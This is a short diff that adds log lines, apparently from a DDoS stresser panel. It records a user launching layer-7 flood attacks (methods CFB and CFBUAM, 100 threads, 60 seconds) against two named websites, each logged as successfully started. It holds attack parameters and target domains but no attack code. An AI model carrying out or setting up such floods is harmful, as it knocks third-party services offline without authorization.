@@ -1,0 +1,6 @@
+[2025-11-09T17:11:44.104Z] [ATTACK] Attack initiated by user 8426540797: {"layer":"layer_7","method":"CFB","target":"https://store.aryapanel.xyz","threads":100,"duration":60,"rpc":1}
+[2025-11-09T17:11:44.933Z] [ATTACK] Starting attack - Target: https://store.aryapanel.xyz, Method: CFB, Threads: 100, Duration: 60s
+[2025-11-09T17:11:44.935Z] [ATTACK] Attack successfully started
+[2025-11-09T17:14:12.077Z] [ATTACK] Attack initiated by user 8426540797: {"layer":"layer_7","method":"CFBUAM","target":"https://aryapanel.xyz","threads":100,"duration":60,"rpc":1}
+[2025-11-09T17:14:12.842Z] [ATTACK] Starting attack - Target: https://aryapanel.xyz, Method: CFBUAM, Threads: 100, Duration: 60s
+[2025-11-09T17:14:12.846Z] [ATTACK] Attack successfully started
